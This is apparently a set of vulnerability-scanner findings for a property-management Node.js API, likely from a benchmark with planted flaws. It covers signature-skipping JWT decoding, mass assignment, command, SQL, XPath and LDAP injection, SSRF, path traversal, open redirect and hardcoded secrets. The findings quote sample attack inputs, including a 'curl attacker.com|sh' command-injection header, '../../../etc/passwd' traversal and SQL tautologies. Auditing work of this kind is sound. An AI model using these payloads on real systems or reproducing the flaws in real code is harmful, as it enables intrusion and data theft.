extra.message: resolveDispatchBrief() uses app.jwt.decode() instead of app.jwt.verify() to read the dispatch token used by /dispatch/:token, /dispatch/:token/queue, /dispatch/:token/materials-receipt and /dispatch/:token/complete (all outside the /api/ prefix and therefore not covered by the global authenticate onRequest hook in index.ts). jwt.decode() only base64-decodes the payload and never checks the signature, so any attacker can craft an arbitrary '{"ticketId":"...","contractor":"..."}' JWT-shaped string with no valid signature and fully impersonate a dispatch link, reading and modifying any maintenance ticket (including marking it completed) with zero authentication.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: mergeDeviceSyncSnapshot() (lines 21-23) does Object.assign(user, snapshot) where snapshot is JSON.parse()'d directly from the attacker-controlled 'mobileSyncSnapshot' cookie, then the merged entity is saved. Any authenticated user (even a tenant) can send a cookie like mobileSyncSnapshot={"role":"property_admin","isActive":true} to POST /api/notifications/device-sync/restore and overwrite arbitrary User columns, including role and passwordHash, achieving full privilege escalation. Contrast with the safe twin applyVerifiedDeviceSyncSnapshot()/'/restore-verified', which validates the payload against a strict zod schema allowing only phone/avatarUrl.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: renderCorrespondencePacket() builds a shell command via string interpolation: execSync(`pandoc ${sourceMarkdownPath} -o ${outFile} --pdf-engine-opt=${paperProfile}`). paperProfile is taken directly from the attacker-controlled 'x-mailroom-paper-profile' request header at line 259 (route POST /api/messages/notices/:id/print-packet) with no allowlist/escaping, allowing arbitrary OS command injection, e.g. header value '$(reboot)' or '; curl attacker.com|sh #'. Contrast with leases.ts renderRenewalPacket, which validates the profile against ALLOWED_PAPER_PROFILES and uses spawn() with shell:false.

buildMaintenanceReportCommand() interpolates 'preset' directly into a shell command string, which is then executed via spawn('bash', ['-c', cmd], {shell:true, ...}) at line 300 in GET /api/export/maintenance/rendered. 'preset' comes unsanitized from the 'reportPreset' cookie or a query parameter (line 296), with no allowlist (unlike buildInspectionsReportArgs, which validates against ALLOWED_REPORT_TEMPLATES and is invoked with shell:false and an argv array). An attacker can inject shell metacharacters to execute arbitrary commands.

evaluateMoveOutProrationFormula() executes attacker-supplied text as JavaScript via new Function('params', `return (${formula})`). The formula string is taken directly from the 'prorationFormula' multipart field of POST /api/leases/:id/moveout-worksheet (lines 324-344) with no sanitization, restriction, or sandboxing, allowing arbitrary code execution in the Node.js process (e.g. formula = 'require("child_process").execSync("...")').

buildSavedSearchFilterClause() builds a raw SQL WHERE clause by string concatenation of both the field name and value: `unit.${field} = '${value}'`, joined and passed straight into qb.andWhere(clause) at line 125 in GET /api/units/saved-search. Both keys and values come from unvalidated req.query criteria (line 120), so a query string like ?status=x' OR '1'='1 or a fake field name lets an attacker inject arbitrary SQL into the generated query.

findPaymentsByLedgerCriteria() concatenates both column names and values from the request body directly into a raw SQL string (`"${field}" = '${value}'`) and executes it via AppDataSource.query(sql), reachable from POST /api/payments/ledger-reconciliation (lines 150-157) with no validation of the criteria object, unlike the sibling findPaymentsByCustomView which validates with a strict zod schema. This allows full SQL injection.

searchLeaseNotesByTerm() interpolates the user-supplied 'term' directly into a raw SQL string (`WHERE notes ILIKE '%${term}%'`) run via AppDataSource.query(), reachable from GET /api/leases/notes-search?term=... (lines 182-187) with no parameterization or escaping, allowing SQL injection (e.g. term=%' OR '1'='1).

mirrorArchiveSourceFile() performs fetch(sourceUrl) with no host allowlist, and is reachable from POST /api/documents/import-from-source (lines 264-289) for any property_admin/property_manager with an arbitrary attacker-supplied 'sourceUrl' in the request body. This allows SSRF against internal services (e.g. http://169.254.169.254/, internal admin panels), whose response body is written to disk and returned. Contrast with the safe twin mirrorTrustedArchiveSourceFile(), which enforces ALLOWED_ARCHIVE_SOURCE_HOSTS.

findAmenityMatchesUnsafe() builds an XPath expression by directly interpolating 'amenityName' into the query string (`//amenity[@name='${amenityName}'] | ...`). amenityName is stored from a prior POST /api/buildings/:id/amenities/search-preference call and then used unescaped in GET /api/buildings/:id/amenities/quick-view (lines 114-132), allowing XPath injection (e.g. closing the quote to inject `' or '1'='1`) to bypass the intended filter and extract arbitrary nodes from the amenities XML. The safe twin findAmenityMatchesSafely() correctly escapes the value with escapeXPathString().

searchStaffDirectory() builds an LDAP filter by directly interpolating the unescaped 'term' parameter (`(&(objectClass=person)(cn=*${term}*))`), reachable from GET /api/buildings/:id/onsite-staff?name=... (buildings.ts lines 194-205). An attacker-controlled 'name' value containing '*)(|' filter metacharacters can inject arbitrary LDAP filter clauses, bypassing the intended search and potentially disclosing unrelated directory entries. The sibling function queryEmployeeDirectory() correctly escapes filter metacharacters with escapeLdapFilterValue().

depositMoveOutPacketInTenantArchive() joins the tenant-controlled profile.moveOutPacketFolder directly into a filesystem path (path.join(TENANT_ARCHIVE_ROOT, profile.userId, profile.moveOutPacketFolder || '.')) with no sanitization. moveOutPacketFolder is settable by any tenant via PATCH /api/users/me/profile (users.ts lines 221-233, no validation) to a value like '../../../etc' and is then used by POST /api/leases/:id/move-out-packet (lines 268-281) to write a file outside the intended tenant archive directory. The safe twin depositMoveOutPacketInTenantArchiveSafely() resolves and checks the path stays under the tenant root.

listRecordsRoomFolder() joins the 'folder' route parameter directly into fs.readdirSync(path.join(RECORDS_ROOM_DIR, folder)) with no sanitization, reachable from GET /api/documents/records-room/:folder (lines 112-120). A value like '../../' allows listing arbitrary directories on the filesystem outside RECORDS_ROOM_DIR. The safe twin listRecordsRoomFolderSafely() applies path.basename() to strip traversal sequences.

loadReportTemplateSource() joins the unsanitized 'templateName' route param into fs.readFileSync(path.join(REPORT_TEMPLATE_DIR, templateName)), reachable from GET /api/export/report-templates/:templateName/source (lines 325-334). A value like '../../../etc/passwd' reads arbitrary files on disk. The safe twin loadReportTemplateSourceSafely() resolves the path and verifies it stays within REPORT_TEMPLATE_DIR.

resolveDispatchReturnDestination() returns the raw 'x-return-url' request header value with no allowlist/validation, and reply.redirect(destination) is called with it at line 130 in POST /dispatch/:token/complete. An attacker (who, per the jwt.decode finding above, doesn't even need a valid token) can set x-return-url to an external URL to redirect victims to a phishing site. Contrast with tickets.ts resolveTenantConfirmationDestination(), which restricts the destination to ALLOWED_TENANT_CONFIRMATION_DESTINATIONS.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: app.register(cors, { origin: true, credentials: true }) reflects any request Origin back in Access-Control-Allow-Origin while also allowing credentials (cookies) to be sent cross-origin. Combined with the auth-carrying cookies issued elsewhere in the app (staffDeviceSession, portalKioskSession, browsingSessionId), any malicious website can make credentialed cross-origin requests to this API and read the JSON responses, defeating the same-origin policy.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: openKioskPortalSession() sets the 'portalKioskSession' cookie carrying a signed 12h JWT (see /api/auth/kiosk-checkin, lines 96-106) with no HttpOnly, Secure, or SameSite attributes, unlike openStaffDeviceSession() (lines 35-39) which sets HttpOnly, SameSite=Strict and Secure-in-production for an equivalent auth cookie. The kiosk session token is readable by any JavaScript on the page (XSS-exfiltrable) and sent over plain HTTP and cross-site requests.

recordSearchActivity() writes the raw, unsanitized user-supplied query directly into a log line via console.log, reachable from GET /api/tickets/descriptions-search?term=... (tickets.ts line 190). An attacker can embed newline/control characters in 'term' to inject forged log entries or corrupt log parsing. The safe twin recordSearchActivitySafely() strips \r\n\0 before logging.

cwe: CWE-117: Improper Output Neutralization for Logs

extra.message: resolvePriorityBoostFromClientClaim() grants a 'high' priority boost purely based on a client-supplied 'serviceLevel' field in the request body (POST /api/tickets/:id/priority-boost, lines 330-345), with no server-side verification of the tenant's actual plan. Any tenant can send {serviceLevel:'premium'} to jump their own maintenance ticket queue position. Contrast with resolvePriorityBoostFromLeaseRecord()/'-verified', which derives the entitlement from the tenant's actual lease/autopay record.

cwe: CWE-807: Reliance on Untrusted Inputs in a Security Decision

extra.message: The JWT signing secret falls back to the hardcoded literal 'dev-jwt-secret' when process.env.JWT_SECRET is unset. If this fallback is ever active in a deployed environment, an attacker who knows/guesses this well-known default can forge valid authentication tokens for any user/role.

reportPaymentToRentBureau() falls back to a hardcoded, realistic-looking API key literal ('rb_live_9f3ac2b8e7d1a04c') when process.env.RENT_BUREAU_KEY is unset, embedding a live-looking credential directly in source code.
